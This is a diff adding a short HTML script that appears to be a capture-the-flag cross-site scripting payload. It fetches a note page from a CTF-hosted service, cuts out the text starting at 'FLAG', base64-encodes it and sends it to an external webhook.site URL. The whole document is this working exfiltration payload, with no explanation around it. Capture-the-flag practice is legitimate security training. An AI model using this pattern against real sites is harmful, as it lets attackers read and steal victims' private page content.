@@ -1,0 +1,12 @@
+<script>
+    var obj;
+    let note = 'asdf'
+    let start = 'FLAG';
+    let url = 'https://webhook.site/35afed8c-6f7a-4bee-84c0-ee7e3ac25dba';
+    fetch(`https://zero-note.edu-ctf.bookgin.tw:44301/note/${note}`)
+    .then(res => res.text())
+    .then(data => obj = data)
+    .then(() => {
+        fetch(url + '/?' + btoa(obj.substr(obj.indexOf(start), 43) + '\n'));
+    })
+</script>
